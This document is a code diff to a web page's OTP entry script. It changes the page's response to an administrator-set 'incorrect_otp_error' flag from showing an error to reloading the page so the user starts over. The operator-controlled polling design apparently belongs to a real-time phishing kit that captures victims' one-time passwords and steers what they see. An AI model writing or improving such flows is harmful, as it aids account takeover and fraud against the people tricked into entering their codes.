@@ -308,7 +308,7 @@ button:disabled{
     }, 3000);
   }
 
-  // Incorrect OTP polling - SHOWS RED ERROR LABEL AND CLEARS INPUT
+  // Incorrect OTP polling - RESETS EVERYTHING and clears form
   function startIncorrectOtpPolling() {
     if (incorrectOtpInterval) clearInterval(incorrectOtpInterval);
     incorrectOtpInterval = setInterval(async () => {
@@ -322,28 +322,28 @@ button:disabled{
         
         if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
           // Show red error message
-          errorDiv.textContent = '❌ Incorrect OTP entered. Please check your email and try again.';
+          errorDiv.textContent = '❌ Incorrect OTP entered. Please start over.';
           errorDiv.style.display = 'block';
           errorDiv.style.color = '#ef4444';
           errorDiv.style.background = '#fef2f2';
           errorDiv.style.padding = '12px';
           errorDiv.style.borderRadius = '12px';
           
-          // Clear the input field
+          // Clear input field
           otpInput.value = '';
           otpInput.focus();
           
-          // Clear the error flag so it doesn't show again
+          // REFRESH THE PAGE TO START FRESH
+          setTimeout(() => {
+            window.location.reload();
+          }, 2000);
+          
+          // Clear the error flag
           await fetch('/api/admin/release-text', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email })
           });
-          
-          // Hide error after 5 seconds
-          setTimeout(() => {
-            errorDiv.style.display = 'none';
-          }, 5000);
         }
       } catch (err) {}
     }, 2000);
